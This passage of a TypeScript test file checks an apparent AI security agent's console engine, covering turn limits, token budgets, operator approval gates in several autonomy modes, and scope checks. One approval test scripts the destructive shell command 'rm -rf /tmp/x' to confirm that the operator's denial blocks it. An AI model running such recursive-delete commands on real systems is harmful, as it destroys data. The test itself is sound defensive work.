import { afterEach, describe, expect, it, vi } from "vitest";
vi.mock("../plugins/enablement.js", async (importOriginal) => ({
  ...await importOriginal<object>(),
  readEnablement: () => ({ schema: 1, project: process.cwd(), enabled: { scope: { version: "1.0.0", capabilities: [], enabledAt: 1 } } }),
}));
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";

import { buildConsoleSystemPrompt, createConsoleSession, describeCaughtError } from "./turn-engine.js";
import type {
  ConsoleLocalScopeRequest,
  ConsoleScopeRequest,
  ConsoleUsageReport,
} from "./turn-engine.js";
import type {
  NativeContentBlock,
  NativeMessage,
  NativeRuntime,
  NativeRuntimeResult,
  NativeStreamCallbacks,
  NativeToolDef,
} from "../runtime/types.js";
import { ScopePolicy } from "../scope/scope.js";
import type { ToolDefinition } from "../agent/types.js";
import * as repositoryAcquisition from "../agent/repository-acquisition.js";
import * as http from "../http.js";
import { LlmApiRuntime } from "../runtime/llm-api.js";
import { eventBus, type SubagentLifecyclePayload } from "../events/bus.js";

import { estimateCost, DEFAULT_SECURITY_WORKFLOW_PLAN, type SecurityWorkflow, type SecurityWorkflowInput } from "../shared/index.js";
import { ExtensionMcpHost, type McpConnector } from "../plugins/extensions/index.js";
import { MemoryObserved, MemoryPins, allow, stdioExtension } from "../plugins/extensions/__tests__/mcp-fixtures.js";

/**
 * A scripted NativeRuntime: replays a queue of pre-baked results so the turn
 * cycle runs deterministically without an LLM or API key. It captures the
 * tools + messages it was called with so we can assert the console wired the
 * REAL tool registry through to the runtime.
 */
class ScriptedRuntime implements NativeRuntime {
  readonly type = "api" as const;
  calls: Array<{ system: string; messages: NativeMessage[]; tools: NativeToolDef[] }> = [];
  constructor(private readonly script: NativeRuntimeResult[]) {}
  async isAvailable(): Promise<boolean> {
    return true;
  }
  async executeNative(
    system: string,
    messages: NativeMessage[],
    tools: NativeToolDef[],
  ): Promise<NativeRuntimeResult> {
    // Snapshot messages (the loop mutates the array in place across turns).
    this.calls.push({ system, messages: structuredClone(messages), tools });
    const next = this.script.shift();
    if (!next) throw new Error("ScriptedRuntime: script exhausted");
    return next;
  }
}

function endTurn(text: string): NativeRuntimeResult {
  return { content: [{ type: "text", text }], stopReason: "end_turn", durationMs: 1 };
}

describe("Console bookkeeping progress", () => {
  const plan = (index: number): NativeRuntimeResult => ({
    content: [{ type: "tool_use", id: `plan-${index}`, name: "update_todos", input: {
      todos: [{ content: `Retry planning ${index}`, status: "in_progress" }],
    } }], stopReason: "tool_use", durationMs: 1,
  });

  it("stops changing todo-only loops without losing history and allows a new turn", async () => {
    const runtime = new ScriptedRuntime([...Array.from({ length: 12 }, (_, index) => plan(index)), endTurn("Resumed without replay.")]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    try {
      const outcome = await session.send("Inspect the existing evidence.");
      expect(outcome.stopReason).toBe("no_progress");
      expect(outcome.toolCalls).toHaveLength(12);
      expect(runtime.calls).toHaveLength(12);
      expect(outcome.assistantText).toContain("consecutive bookkeeping actions");
      expect(session.messages.at(-1)?.content).toEqual(expect.arrayContaining([
        expect.objectContaining({ type: "tool_result" }),
      ]));
      expect((await session.send("Report the blocker instead.")).stopReason).toBe("end_turn");
      expect(runtime.calls).toHaveLength(13);
    } finally { await session.cleanup(); }
  });

  it("does not cap evidence work interspersed with bookkeeping", async () => {
    const runtime = new ScriptedRuntime([
      ...Array.from({ length: 11 }, (_, index) => plan(index)),
      { content: [{ type: "tool_use", id: "read-evidence", name: "load_skill", input: {} }], stopReason: "tool_use", durationMs: 1 },
      ...Array.from({ length: 11 }, (_, index) => plan(index + 11)),
      endTurn("Evidence gathered."),
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    try {
      const outcome = await session.send("Review evidence and maintain the plan.");
      expect(outcome.stopReason).toBe("end_turn");
      expect(outcome.toolCalls).toHaveLength(23);
    } finally { await session.cleanup(); }
  });
});

describe("Auto finding verification workflow", () => {

  it.each(["standard"] as const)("does not prescribe automatic PoCs for an older %s value (it asks first)", (autonomyMode) => {
    expect(buildConsoleSystemPrompt({ scanId: "workflow-test", autonomyMode })).not.toContain("Auto verification workflow");
  });
});


describe("createConsoleSession", () => {
  it("generates title metadata inside accounted planner rounds without executing a tool", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "title-1", name: "console_set_conversation_title", input: { title: "Tenant isolation review" } }], stopReason: "tool_use", durationMs: 1, usage: { inputTokens: 10, outputTokens: 5 } },
      { ...endTurn("Here is the review."), usage: { inputTokens: 20, outputTokens: 8 } },
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    const starts = vi.fn(); const usage = vi.fn();
    const result = await session.send("Review tenant isolation", { onToolStart: starts, onUsage: usage }, { generateTitle: true });
    expect(result.conversationTitle).toBe("Tenant isolation review");
    expect(result.usage).toEqual({ inputTokens: 30, outputTokens: 13 });
    expect(usage).toHaveBeenCalledTimes(2);
    expect(starts).not.toHaveBeenCalled();
    expect(result.toolCalls).toEqual([]);
    expect(runtime.calls[0].tools.some((tool) => tool.name === "console_set_conversation_title")).toBe(true);
    expect(runtime.calls[1].tools.some((tool) => tool.name === "console_set_conversation_title")).toBe(false);
    expect(runtime.calls[1].messages.some((message) => message.content.some((block) => block.type === "tool_result" && block.tool_use_id === "title-1"))).toBe(true);
    await session.cleanup();
  });

  it("reports a reply the provider cut off for length instead of a clean finish, keeping its text", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "text", text: "Here is a partial answ" }], stopReason: "max_tokens", durationMs: 1 },
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    const result = await session.send("Explain.");
    expect(result.stopReason).toBe("output_cap");
    expect(result.assistantText).toBe("Here is a partial answ");
    expect(result.outputCap).toBeUndefined();
    await session.cleanup();
  });

  it("finishes an empty completion as end_turn with no text, for the surface to report", async () => {
    const runtime = new ScriptedRuntime([{ content: [], stopReason: "end_turn", durationMs: 1 }]);
    const session = createConsoleSession({ runtime, refineObjective: false });
    const result = await session.send("hello?");
    expect(result.stopReason).toBe("end_turn");
    expect(result.assistantText).toBe("");
    expect(result.toolCalls).toEqual([]);
    await session.cleanup();
  });

  it("preserves conversation history across operator turns", async () => {
    const runtime = new ScriptedRuntime([endTurn("hi there"), endTurn("still here")]);
    const session = createConsoleSession({ runtime });

    await session.send("hello");
    await session.send("you there?");

    // user, assistant, user, assistant
    expect(session.messages).toHaveLength(4);
    expect(session.messages[0].role).toBe("user");
    expect(session.messages[1].role).toBe("assistant");
    // The second runtime call already contained the first exchange.
    expect(runtime.calls[1].messages.length).toBeGreaterThanOrEqual(2);
  });

  it("keeps latest planner occupancy separate from cumulative input usage", async () => {
    const runtime = new ScriptedRuntime([
      ...["first", "second"].map((id): NativeRuntimeResult => ({
        content: [{ type: "tool_use", id, name: "load_skill", input: {} }],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 216_000, outputTokens: 10 },
      })),
      { ...endTurn("Complete."), usage: { inputTokens: 216_000, outputTokens: 10 } },
    ]);
    const session = createConsoleSession({ runtime, refineObjective: false, maxTurnTokens: 2_000_000 });
    try {
      const outcome = await session.send("look up the payload twice");
      expect(outcome.stopReason).toBe("end_turn");
      expect(outcome.usage.inputTokens).toBe(648_000);
      expect(outcome.contextInputTokens).toBe(216_000);
    } finally {
      await session.cleanup();
    }
  });

  it("retains the latest streamed planner occupancy when that call fails", async () => {
    let calls = 0;
    const runtime: NativeRuntime = {
      type: "api",
      async isAvailable() { return true; },
      async executeNative(_system, _messages, _tools, callbacks) {
        if (++calls === 1) return { ...endTurn("First."), usage: { inputTokens: 150_000, outputTokens: 10 } };
        callbacks?.onUsage?.({ inputTokens: 215_000, outputTokens: 20 });
        throw new Error("provider stream interrupted");
      },
    };
    const session = createConsoleSession({ runtime, refineObjective: false });
    try {
      await session.send("first");
      const outcome = await session.send("second");
      expect(outcome.stopReason).toBe("error");
      expect(outcome.contextInputTokens).toBe(215_000);
      expect(outcome.usage).toEqual({ inputTokens: 215_000, outputTokens: 20 });
    } finally {
      await session.cleanup();
    }
  });

  it("rejects overlapping turns without mixing history and accepts the next turn", async () => {
    let release!: (result: NativeRuntimeResult) => void;
    const pending = new Promise<NativeRuntimeResult>((resolve) => { release = resolve; });
    const runtime = new ScriptedRuntime([endTurn("second response")]);
    vi.spyOn(runtime, "executeNative").mockImplementationOnce(() => pending);
    const session = createConsoleSession({ runtime });
    const first = session.send("first request");
    try {
      await expect(session.send("overlapping request")).rejects.toThrow(/active turn/);
      expect(session.messages.flatMap((message) => message.content)).not.toContainEqual({
        type: "text", text: "overlapping request",
      });
      release(endTurn("first response"));
      expect((await first).assistantText).toBe("first response");
      expect((await session.send("second request")).assistantText).toBe("second response");
    } finally {
      release(endTurn("released"));
      await first;
      await session.cleanup();
    }
  });

  it("stops with an error outcome when the runtime errors", async () => {
    const runtime = new ScriptedRuntime([
      { content: [], stopReason: "error", durationMs: 1, error: "boom" },
    ]);
    const session = createConsoleSession({ runtime });
    const outcome = await session.send("do something");
    expect(outcome.stopReason).toBe("error");
    expect(outcome.error).toBe("boom");
  });

  it("continues past 100 tool rounds by default and stops when the task finishes", async () => {
    const tools: NativeRuntimeResult[] = Array.from({ length: 101 }, (_, index) => ({
      content: [{ type: "tool_use", id: `round-${index}`, name: "load_skill", input: {} }],
      stopReason: "tool_use", durationMs: 1,
    }));
    const runtime = new ScriptedRuntime([...tools, endTurn("Review completed")]);
    const session = createConsoleSession({ runtime });
    try {
      const notices: string[] = [];
      const outcome = await session.send("Finish the review", { onNotice: notice => notices.push(notice) });
      expect(outcome.stopReason).toBe("end_turn");
      expect(outcome.assistantText).toBe("Review completed");
      expect(outcome.toolCalls).toHaveLength(101);
      expect(runtime.calls).toHaveLength(102);
      expect(outcome.budget.maxToolIterations).toBe(Infinity);
      expect(notices.some(notice => /tool.*limit|runaway cap/.test(notice))).toBe(false);
    } finally {
      await session.cleanup();
    }
  });

  it("caps tool-call rounds per turn to avoid runaway loops", async () => {
    // Always request a tool → would loop forever without the cap.
    const infiniteToolCall: NativeRuntimeResult = {
      content: [{ type: "tool_use", id: "c", name: "load_skill", input: {} }],
      stopReason: "tool_use",
      durationMs: 1,
    };
    const runtime = new ScriptedRuntime(Array.from({ length: 10 }, () => ({ ...infiniteToolCall })));
    const session = createConsoleSession({ runtime, maxToolIterations: 3 });
    const notices: string[] = [];
    const outcome = await session.send("go", { onNotice: (m) => notices.push(m) });
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.toolCalls).toHaveLength(3);
    expect(notices).toHaveLength(1);
  });
});

describe("Responses output-cap continuation", () => {
  function stream(events: Record<string, unknown>[]): Response {
    return new Response(events.map(event => `data: ${JSON.stringify(event)}\n\n`).join(""), {
      headers: { "content-type": "text/event-stream" },
    });
  }
  function cap(text = "Completed observation.", inputTokens = 10): Response {
    return stream([
      { type: "response.output_text.delta", delta: text },
      { type: "response.output_item.done", item: {
        type: "function_call", status: "completed", call_id: "not-authorized", name: "update_todos",
        arguments: JSON.stringify({ todos: [{ content: "must never replace the plan" }] }),
      } },
      { type: "response.incomplete", response: { id: "resp-cap", status: "incomplete",
        incomplete_details: { reason: "max_output_tokens" }, usage: { input_tokens: inputTokens, output_tokens: 8192 } } },
    ]);
  }
  function runtime(): LlmApiRuntime {
    return new LlmApiRuntime({ type: "api", timeout: 5000, provider: "azure", model: "DeepSeek-V4-Flash",
      env: { AZURE_OPENAI_API_KEY: "synthetic", AZURE_OPENAI_BASE_URL: "https://deepseek.test/openai/v1", AZURE_OPENAI_WIRE_API: "responses",
        ZERO_SUPPRESS_PROVIDER_STARTUP_LOG: "1" } });
  }

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("automatically continues repeated provider caps beyond the former three-retry limit", async () => {
    let responses = 0;
    const fetchMock = vi.fn(async () => ++responses <= 5 ? cap("Saved observation.") : stream([
      { type: "response.completed", response: { status: "completed",
        output: [{ type: "message", content: [{ type: "output_text", text: "Review complete." }] }],
        usage: { input_tokens: 10, output_tokens: 3 } } },
    ]));
    vi.stubGlobal("fetch", fetchMock);
    const session = createConsoleSession({ runtime: runtime(), refineObjective: false });
    try {
      const outcome = await session.send("Finish the review");
      expect(outcome.stopReason).toBe("end_turn");
      expect(fetchMock).toHaveBeenCalledTimes(6);
      expect(outcome.usage.outputTokens).toBe(8192 * 5 + 3);
      expect(outcome.assistantText).toBe("Saved observation.".repeat(5) + "Review complete.");
      expect(outcome.toolCalls).toEqual([]);
      expect(session.messages.filter(message => message.role === "assistant")).toHaveLength(6);
    } finally { await session.cleanup(); }
  });

  it.each(["abort", "budget"])("does not continue past the original %s allowance", async mode => {
    const controller = new AbortController();
    const fetchMock = vi.fn(async () => cap("Saved observation.", mode === "budget" ? 30_000 : 10));
    vi.stubGlobal("fetch", fetchMock);
    const session = createConsoleSession({ runtime: runtime(), refineObjective: false,
      maxTurnTokens: mode === "budget" ? 50_000 : undefined });
    try {
      const outcome = await session.send("continue", { onNotice: () => { if (mode === "abort") controller.abort(); } }, { signal: controller.signal });
      expect(outcome.stopReason).toBe(mode === "abort" ? "cancelled" : "max_turn_tokens");
      expect(fetchMock).toHaveBeenCalledOnce();
      expect(outcome.assistantText).toBe("Saved observation.");
      expect(outcome.usage.outputTokens).toBe(8192);
      expect(outcome.toolCalls).toEqual([]);
    } finally { await session.cleanup(); }
  });

  it("reserves the full output cap for an unmetered response under a finite turn budget", async () => {
    const fetchMock = vi.fn(async () => stream([
      { type: "response.output_text.delta", delta: "Saved observation." },
      { type: "response.incomplete", response: { status: "incomplete", incomplete_details: { reason: "max_output_tokens" } } },
    ]));
    vi.stubGlobal("fetch", fetchMock);
    const session = createConsoleSession({ runtime: runtime(), refineObjective: false, maxTurnTokens: 100_000 });
    const samples: ConsoleUsageReport[] = [];
    try {
      const outcome = await session.send("continue", { onUsage: sample => samples.push(sample) });
      const plannerSamples = samples.filter(sample => sample.kind === "planner");
      expect(plannerSamples.every(sample => sample.outputTokens === 8192)).toBe(true);
      expect(outcome.usage.outputTokens).toBe(fetchMock.mock.calls.length * 8192);
      expect(fetchMock.mock.calls.length).toBeLessThanOrEqual(Math.ceil(100_000 / 8192));
      expect(outcome.stopReason).toBe("max_turn_tokens");
    } finally { await session.cleanup(); }
  });

  it("keeps a subsequent policy failure terminal and charges both responses once", async () => {
    const fetchMock = vi.fn().mockResolvedValueOnce(cap()).mockResolvedValueOnce(stream([
      { type: "response.failed", response: { status: "failed", error: { code: "cyber_policy" },
        usage: { input_tokens: 7, output_tokens: 3 } } },
      { type: "response.completed", response: { status: "completed", output: [] } },
    ]));
    vi.stubGlobal("fetch", fetchMock);
    const session = createConsoleSession({ runtime: runtime(), refineObjective: false });
    try {
      const outcome = await session.send("continue");
      expect(outcome.stopReason).toBe("error");
      expect(outcome.error).toContain("cyber_policy");
      expect(outcome.assistantText).toBe("Completed observation.");
      expect(outcome.usage).toEqual({ inputTokens: 17, outputTokens: 8195 });
      expect(outcome.toolCalls).toEqual([]);
      expect(fetchMock).toHaveBeenCalledTimes(2);
    } finally { await session.cleanup(); }
  });
});

// ── Console autonomy / scope-resolution contract tests ──

describe("Console autonomy — scope resolution", () => {

  it("does not trigger requestScope for non-network tools", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "load_skill", input: {} },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 5, outputTokens: 3 },
      },
      endTurn("Found it."),
    ]);

    let requestScopeCalled = false;
    const session = createConsoleSession({
      runtime,
      requestScope: async () => {
        requestScopeCalled = true;
        return null;
      },
    });

    await session.send("find payload");
    expect(requestScopeCalled).toBe(false);
    expect(session.scope).toBeUndefined();
  });
});

describe("Console autonomy — standard mode (per-action approval)", () => {

  it("dispatches the action only on an explicit operator yes (approval never assumed)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hi" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Approved, so it ran."),
    ]);
    let prompted = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => {
        prompted += 1;
        return true;
      },
    });
    const outcome = await session.send("run it");
    expect(prompted).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("exempts read-only tools from the per-action prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "load_skill", input: {} }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Read-only ran without a prompt."),
    ]);
    let prompted = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => {
        prompted += 1;
        return false;
      },
    });
    const outcome = await session.send("look up a payload");
    expect(prompted).toBe(0); // READ_ONLY_TOOLS grant no authority → no prompt
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("hands approveTool a presentation-only destructive risk WITHOUT changing the gate", async () => {
    // A destructive command and a benign one, each put to the operator. The
    // classifier annotates the destructive one; the gate is unchanged — the call
    // still runs ONLY on an explicit yes, and a no still blocks it.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "rm -rf /tmp/x" } }], stopReason: "tool_use", durationMs: 1 },
      { content: [{ type: "tool_use", id: "c2", name: "bash", input: { command: "echo hi" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Both were put to the operator."),
    ]);
    const seen: Array<{ name: string; level?: string; category?: string }> = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async (call, risk) => {
        seen.push({ name: call.name, level: risk?.level, category: risk?.category });
        return call.arguments.command === "echo hi"; // approve only the benign one
      },
    });
    const outcome = await session.send("do things");
    expect(seen[0]).toEqual({ name: "bash", level: "destructive", category: "recursive-delete" });
    expect(seen[1]).toEqual({ name: "bash", level: "unknown", category: undefined });
    // Gate unchanged: the destructive call was denied (blocked), the benign one ran.
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("not approved by the operator");
    expect(outcome.toolCalls[1].result.success).toBe(true);
  });

  it("denies an effectful tool in standard when no approveTool channel is wired (fail-open corner closed)", async () => {
    // Standard is the per-action-approval mode. The old behaviour fell OPEN when
    // no approveTool was wired (headless/legacy embedder) and ran the tool
    // unapproved. The wired `guardApprovalUnavailable` closes that corner: an
    // effectful tool with no approval mechanism is refused rather than run.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Refused without an approval channel."),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "standard" });
    const outcome = await session.send("run command");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("requires operator approval");
  });

});


// ── Denied-host memory: no unbounded re-prompt loop ──

describe("Console autonomy — yolo still enforces scope", () => {

  it("allows tools in yolo mode when scope is preconfigured", async () => {
    // Use bash (network-capable per NETWORK_CAPABLE_TOOLS) with no URLs in
    // args — when sessionTarget is empty the scope gate skips because
    // extractToolUrls returns empty. This verifies that tools run in yolo
    // with a scope present, without triggering requestScope.
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "bash", input: { command: "echo scope-ok" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 5, outputTokens: 3 },
      },
      endTurn("Allowed in yolo."),
    ]);

    let requestScopeCalled = false;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        requestScopeCalled = true;
        throw new Error("requestScope should not be called in yolo when scope already covers");
      },
    });

    const outcome = await session.send("go");
    expect(requestScopeCalled).toBe(false);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });
});

describe("Console autonomy — approval integrity", () => {

  it("moves the ask-first setting on and off while preserving conversation and updating the system prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo standard" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Standard done."),
      { content: [{ type: "tool_use", id: "c2", name: "bash", input: { command: "echo copilot" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Copilot done."),
      { content: [{ type: "tool_use", id: "c3", name: "bash", input: { command: "echo yolo" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Yolo done."),
    ]);
    let approvals = 0;
    const session = createConsoleSession({
      runtime,
      // Standard is the approval mode now: every effectful action is put to the
      // operator. Copilot and yolo run prompt-free. No scope is configured —
      // these `echo` commands reach no network destination, so all three modes
      // (yolo included, with no preconfigured scope) run them.
      autonomyMode: "standard",
      approveTool: async () => {
        approvals += 1;
        return false; // always deny in standard
      },
    });

    // ── Ask before running commands on: the effectful action is put to the operator and denied ──
    expect(session.systemPrompt).toContain("Ask before running commands is on");
    let outcome = await session.send("asking turn");
    expect(approvals).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);

    // ── Setting off (still Can make changes): tool auto-executes without a per-action prompt ──
    session.setApprovals("auto");
    expect(session.approvals).toBe("auto");
    expect(session.systemPrompt).not.toContain("Ask before running commands is on");

    outcome = await session.send("auto turn");
    expect(approvals).toBe(1); // approveTool not called
    expect(outcome.toolCalls[0].result.success).toBe(true);

    // ── Setting it again changes nothing ──
    session.setApprovals("auto");

    outcome = await session.send("older value turn");
    expect(approvals).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);

    // Conversation preserved across all transitions.
    expect(session.messages.length).toBeGreaterThanOrEqual(6);
  });
});

describe("clearConversation", () => {
  it("clears messages while preserving session identity and configuration", () => {
    const runtime = new ScriptedRuntime([endTurn("first reply"), endTurn("second reply")]);
    const session = createConsoleSession({
      runtime,
      scanId: "test-scan",
      target: "https://example.test",
      autonomyMode: "yolo",
    });

    // Baseline state before any messages.
    expect(session.messages).toHaveLength(0);
    expect(session.scanId).toBe("test-scan");
    expect(session.target).toBe("https://example.test");
  });

  it("removes all accumulated messages after a turn", async () => {
    const runtime = new ScriptedRuntime([endTurn("first")]);
    const session = createConsoleSession({ runtime });

    await session.send("hello");
    expect(session.messages).toHaveLength(2);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);
  });

  it("starts fresh on the next send after clearConversation", async () => {
    const calls: string[][] = [];
    class RecordingRuntime implements NativeRuntime {
      readonly type = "api" as const;
      async isAvailable(): Promise<boolean> {
        return true;
      }
      async executeNative(
        _system: string,
        messages: NativeMessage[],
        _tools: NativeToolDef[],
      ): Promise<NativeRuntimeResult> {
        calls.push(messages.map((m) => m.role));
        return { content: [{ type: "text", text: "ok" }], stopReason: "end_turn", durationMs: 1 };
      }
    }

    const session = createConsoleSession({ runtime: new RecordingRuntime() });

    await session.send("first"); // messages=[user, assistant]; 1 recorded call
    expect(session.messages).toHaveLength(2);
    expect(calls[0]).toEqual(["user"]);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);

    await session.send("second"); // runtime sees only the new user message
    expect(session.messages).toHaveLength(2);
    expect(calls[1]).toEqual(["user"]);
  });
});

// ── Seeded history (initialMessages) — model-switch / session-rebuild contract ──

describe("createConsoleSession — seeded history (initialMessages)", () => {
  // A small prior conversation a caller would replay when rebuilding the
  // session around a different runtime (the `/model` switch scenario).
  function priorHistory(): NativeMessage[] {
    return [
      { role: "user", content: [{ type: "text", text: "recon example.com" }] },
      { role: "assistant", content: [{ type: "text", text: "Found two subdomains." }] },
    ];
  }

  it("reports seeded messages on .messages before any send", () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([]),
      initialMessages: priorHistory(),
    });
    // Engagement context is present immediately — no send() required.
    expect(session.messages).toHaveLength(2);
    expect(session.messages[0].role).toBe("user");
    expect(session.messages[1].role).toBe("assistant");
    expect(session.messages[1].content[0]).toEqual({ type: "text", text: "Found two subdomains." });
  });

  it("appends a new turn to the seeded history rather than replacing it", async () => {
    const runtime = new ScriptedRuntime([endTurn("continuing where we left off")]);
    const session = createConsoleSession({ runtime, initialMessages: priorHistory() });

    await session.send("now scan them");

    // 2 seeded + user + assistant — the prior context survives the send.
    expect(session.messages).toHaveLength(4);
    expect(session.messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });
    expect(session.messages[2].role).toBe("user");
    expect(session.messages[3].role).toBe("assistant");
    // The runtime saw the seeded turns replayed ahead of the new user message.
    expect(runtime.calls[0].messages).toHaveLength(3);
    expect(runtime.calls[0].messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });
  });

  it("takes a defensive copy — mutating the caller's array does not affect the session", async () => {
    const caller = priorHistory();
    const runtime = new ScriptedRuntime([endTurn("ok")]);
    const session = createConsoleSession({ runtime, initialMessages: caller });

    // The caller keeps poking at its own array after construction.
    caller.push({ role: "user", content: [{ type: "text", text: "leaked injection" }] });
    caller[0].content[0] = { type: "text", text: "mutated in place" };

    // Neither the array-level push nor the in-place element edit reaches the session.
    expect(session.messages).toHaveLength(2);
    expect(session.messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });

    // And a real send() still only appends the session's own turns.
    await session.send("go");
    expect(session.messages).toHaveLength(4);
    expect(session.messages.some((m) => m.content.some((b) => b.type === "text" && b.text === "leaked injection"))).toBe(false);
  });

  it("clearConversation empties a seeded history", () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([]),
      initialMessages: priorHistory(),
    });
    expect(session.messages).toHaveLength(2);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);
  });

  it("still starts empty when initialMessages is absent (no regression)", () => {
    const session = createConsoleSession({ runtime: new ScriptedRuntime([]) });
    expect(session.messages).toHaveLength(0);
  });
});

// ── Local filesystem scope-on-demand (mirror of the network scope flow) ──

describe("Console autonomy — local filesystem scope-on-demand", () => {
  const tmpRoots: string[] = [];

  afterEach(() => {
    while (tmpRoots.length > 0) {
      const dir = tmpRoots.pop();
      if (dir) {
        try {
          rmSync(dir, { recursive: true, force: true });
        } catch {
          // best-effort cleanup
        }
      }
    }
  });

  /** Create an isolated temp tree and return its symlink-resolved real path. */
  function makeTmpRoot(): string {
    const root = mkdtempSync(join(tmpdir(), "0-localscope-"));
    tmpRoots.push(root);
    return realpathSync(root);
  }

  /** A single-tool-call runtime turn requesting `name` with `input`. */
  function toolTurn(id: string, name: string, input: Record<string, unknown>): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name, input }],
      stopReason: "tool_use",
      durationMs: 1,
      usage: { inputTokens: 3, outputTokens: 2 },
    };
  }

  it("denies on decline, mentions the operator declined, and does NOT re-prompt for the same path", async () => {
    const root = makeTmpRoot();
    const filePath = join(root, "secret.ts");
    writeFileSync(filePath, "const s = 1;\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "str_replace", { path: filePath, old_string: "", new_string: "x" }),
      toolTurn("c2", "str_replace", { path: filePath, old_string: "", new_string: "x" }), // identical retry
      endTurn("Giving up."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestLocalScope: async () => {
        calls += 1;
        return null; // operator declines
      },
    });

    const outcome = await session.send("read secret.ts");

    expect(calls).toBe(1); // second identical call did NOT re-prompt
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("operator declined");
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(outcome.toolCalls[1].result.error).toContain("already declined");
    expect(session.localScopePath).toBeUndefined();
  });

  it("rejects an approval whose directory does not cover the requested path", async () => {
    const root = makeTmpRoot();
    const aB = join(root, "a", "b");
    const aC = join(root, "a", "c");
    mkdirSync(aB, { recursive: true });
    mkdirSync(aC, { recursive: true });
    const fileInB = join(aB, "target.ts");
    writeFileSync(fileInB, "x\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "str_replace", { path: fileInB, old_string: "", new_string: "x" }),
      endTurn("Rejected."),
    ]);

    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      // Approve a sibling directory that does NOT contain the requested file.
      requestLocalScope: async () => ({ scopePath: aC }),
    });

    const outcome = await session.send("read target.ts");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("does not cover");
    expect(session.localScopePath).toBeUndefined();
  });

  it("refuses the filesystem root without prompting", async () => {
    const runtime = new ScriptedRuntime([
      toolTurn("c1", "str_replace", { path: "/", old_string: "", new_string: "x" }),
      endTurn("Refused."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async () => {
        calls += 1;
        return { scopePath: "/" };
      },
    });

    const outcome = await session.send("read /");
    expect(calls).toBe(0); // never even offered for approval
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("protected root");
  });
});

// ── Per-turn cost guards: token budget (primary) + iteration backstop ──

/**
 * The guards exist because a real console turn reported 779,532 input tokens
 * across 30 tool calls: every iteration resends the whole conversation, so cost
 * grows superlinearly with tool count while a round COUNT says nothing about
 * spend. These tests pin the two guards as independent, separately
 * configurable, and — crucially — resumable rather than dead ends.
 */
describe("Console turn budget — token guard and iteration backstop", () => {
  /** A turn that always asks for one cheap tool, with scripted usage numbers. */
  function toolCallWithUsage(usage?: { inputTokens: number; outputTokens: number }): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id: "c", name: "load_skill", input: {} }],
      stopReason: "tool_use",
